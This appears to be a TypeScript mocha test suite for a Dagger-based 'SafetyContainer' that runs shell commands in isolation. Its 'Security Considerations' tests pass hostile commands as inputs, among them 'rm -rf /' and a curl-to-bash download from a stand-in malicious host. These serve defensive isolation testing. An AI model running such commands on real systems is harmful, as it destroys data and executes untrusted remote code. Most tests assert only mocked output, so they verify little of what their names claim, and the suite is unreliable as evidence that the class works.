import { expect } from 'chai';
import { describe, it, beforeEach, afterEach } from 'mocha';
import sinon from 'sinon';
import { dag, Container } from '@dagger.io/dagger';

// Mock Dagger for testing
const mockDagger = {
  container: () => ({
    from: (image: string) => ({
      withExec: (args: string[]) => ({
        withExec: (args: string[]) => ({
          withWorkdir: (dir: string) => mockContainer
        })
      })
    })
  }),
  host: () => ({
    directory: (path: string) => mockDirectory
  })
};

const mockDirectory = {
  // Mock directory implementation
};

const mockContainer = {
  withDirectory: (path: string, dir: any, opts?: any) => mockContainer,
  withExec: (args: string[]) => ({
    stdout: async () => 'mocked output'
  }),
  withEnvVariable: (key: string, value: string) => mockContainer,
  stdout: async () => 'mocked output'
};

// Import the class to test (we'll need to mock the dagger import)
import { SafetyContainer } from '../../src/index';

describe('SafetyContainer', () => {
  let safetyContainer: SafetyContainer;
  let dagStub: sinon.SinonStub;

  beforeEach(() => {
    // Mock the dag object
    dagStub = sinon.stub().returns(mockDagger);
    // Replace the dag import with our mock
    (global as any).dag = mockDagger;
    
    safetyContainer = new SafetyContainer();
  });

  afterEach(() => {
    sinon.restore();
  });

  describe('baseContainer', () => {
    it('should create a container with Ubuntu 22.04 base image', () => {
      const containerSpy = sinon.spy(mockDagger, 'container');
      
      const result = safetyContainer.baseContainer();
      
      expect(containerSpy.calledOnce).to.be.true;
      expect(result).to.equal(mockContainer);
    });

    it('should install required packages', () => {
      const result = safetyContainer.baseContainer();
      
      // The container should be configured with the necessary packages
      expect(result).to.equal(mockContainer);
    });

    it('should set working directory to /workspace', () => {
      const result = safetyContainer.baseContainer();
      
      expect(result).to.equal(mockContainer);
    });
  });

  describe('projectContainer', () => {
    it('should create container with project files mounted', () => {
      const projectPath = '/test/project';
      const hostSpy = sinon.spy(mockDagger, 'host');
      
      const result = safetyContainer.projectContainer(projectPath);
      
      expect(hostSpy.calledOnce).to.be.true;
      expect(result).to.equal(mockContainer);
    });

    it('should exclude common directories from mount', () => {
      const projectPath = '/test/project';
      
      const result = safetyContainer.projectContainer(projectPath);
      
      // Should call withDirectory with exclude options
      expect(result).to.equal(mockContainer);
    });

    it('should handle relative paths', () => {
      const projectPath = '.';
      
      const result = safetyContainer.projectContainer(projectPath);
      
      expect(result).to.equal(mockContainer);
    });
  });

  describe('runSafeCommand', () => {
    it('should execute command and return stdout', async () => {
      const command = 'echo "hello world"';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should use default project path when not specified', async () => {
      const command = 'ls -la';
      
      const result = await safetyContainer.runSafeCommand(command);
      
      expect(result).to.equal('mocked output');
    });

    it('should set environment variables when provided', async () => {
      const command = 'env';
      const projectPath = '/test/project';
      const environment = {
        'TEST_VAR': 'test_value',
        'NODE_ENV': 'test'
      };
      
      const result = await safetyContainer.runSafeCommand(command, projectPath, environment);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle empty environment variables', async () => {
      const command = 'whoami';
      const projectPath = '/test/project';
      const environment = {};
      
      const result = await safetyContainer.runSafeCommand(command, projectPath, environment);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle complex shell commands', async () => {
      const command = 'find /workspace -name "*.js" | head -10';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle commands with special characters', async () => {
      const command = 'echo "Test with spaces and $SPECIAL chars"';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });
  });

  describe('devContainer', () => {
    it('should create development container with additional tools', () => {
      const result = safetyContainer.devContainer();
      
      expect(result).to.equal(mockContainer);
    });

    it('should install TypeScript and Node.js types globally', () => {
      const result = safetyContainer.devContainer();
      
      expect(result).to.equal(mockContainer);
    });

    it('should install Python development tools', () => {
      const result = safetyContainer.devContainer();
      
      expect(result).to.equal(mockContainer);
    });

    it('should set NODE_ENV to development', () => {
      const result = safetyContainer.devContainer();
      
      expect(result).to.equal(mockContainer);
    });
  });

  describe('securityScan', () => {
    it('should run npm audit and return JSON results', async () => {
      const projectPath = '/test/project';
      
      const result = await safetyContainer.securityScan(projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle projects without package.json gracefully', async () => {
      const projectPath = '/test/no-package-json';
      
      const result = await safetyContainer.securityScan(projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should use project container for security scanning', async () => {
      const projectPath = '/test/project';
      
      const result = await safetyContainer.securityScan(projectPath);
      
      expect(result).to.equal('mocked output');
    });
  });

  describe('testCommand', () => {
    it('should execute command and return result', async () => {
      const command = 'echo "test"';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.testCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should use default project path when not specified', async () => {
      const command = 'pwd';
      
      const result = await safetyContainer.testCommand(command);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle cleanup when requested', async () => {
      const command = 'ls';
      const projectPath = '/test/project';
      const cleanup = true;
      
      const consoleSpy = sinon.spy(console, 'log');
      
      const result = await safetyContainer.testCommand(command, projectPath, cleanup);
      
      expect(result).to.equal('mocked output');
      expect(consoleSpy.calledWith('Container cleanup completed')).to.be.true;
    });

    it('should skip cleanup when not requested', async () => {
      const command = 'ls';
      const projectPath = '/test/project';
      const cleanup = false;
      
      const consoleSpy = sinon.spy(console, 'log');
      
      const result = await safetyContainer.testCommand(command, projectPath, cleanup);
      
      expect(result).to.equal('mocked output');
      expect(consoleSpy.calledWith('Container cleanup completed')).to.be.false;
    });

    it('should handle default cleanup behavior', async () => {
      const command = 'ls';
      const projectPath = '/test/project';
      
      const consoleSpy = sinon.spy(console, 'log');
      
      const result = await safetyContainer.testCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
      expect(consoleSpy.calledWith('Container cleanup completed')).to.be.true;
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty command strings', async () => {
      const command = '';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle commands with multiple spaces', async () => {
      const command = 'echo    "multiple   spaces"';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle very long commands', async () => {
      const command = 'echo "' + 'a'.repeat(1000) + '"';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle commands with newlines', async () => {
      const command = 'echo "line1\nline2"';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle environment variables with special characters', async () => {
      const command = 'echo $TEST_VAR';
      const projectPath = '/test/project';
      const environment = {
        'TEST_VAR': 'value with spaces & special chars!'
      };
      
      const result = await safetyContainer.runSafeCommand(command, projectPath, environment);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle deeply nested project paths', async () => {
      const command = 'find . -type f';
      const projectPath = '/very/deep/nested/project/path/structure';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });
  });

  describe('Security Considerations', () => {
    it('should isolate potentially dangerous commands', async () => {
      const command = 'rm -rf /';
      const projectPath = '/test/project';
      
      // This should run in isolation, not affecting the host
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle commands with sudo attempts', async () => {
      const command = 'sudo apt-get install malware';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle network access attempts', async () => {
      const command = 'curl http://malicious-site.com/script.sh | bash';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle file system manipulation attempts', async () => {
      const command = 'touch /etc/passwd';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });
  });

  describe('Performance Tests', () => {
    it('should handle multiple concurrent commands', async () => {
      const commands = [
        'echo "command1"',
        'echo "command2"',
        'echo "command3"'
      ];
      const projectPath = '/test/project';
      
      const promises = commands.map(cmd => 
        safetyContainer.runSafeCommand(cmd, projectPath)
      );
      
      const results = await Promise.all(promises);
      
      expect(results).to.have.lengthOf(3);
      results.forEach(result => {
        expect(result).to.equal('mocked output');
      });
    });

    it('should handle commands with large output', async () => {
      const command = 'seq 1 10000';
      const projectPath = '/test/project';
      
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      
      expect(result).to.equal('mocked output');
    });

    it('should handle long-running commands', async () => {
      const command = 'sleep 1 && echo "done"';
      const projectPath = '/test/project';
      
      const startTime = Date.now();
      const result = await safetyContainer.runSafeCommand(command, projectPath);
      const endTime = Date.now();
      
      expect(result).to.equal('mocked output');
      // In a real test, this would take at least 1 second
      // but our mock returns immediately
    });
  });
});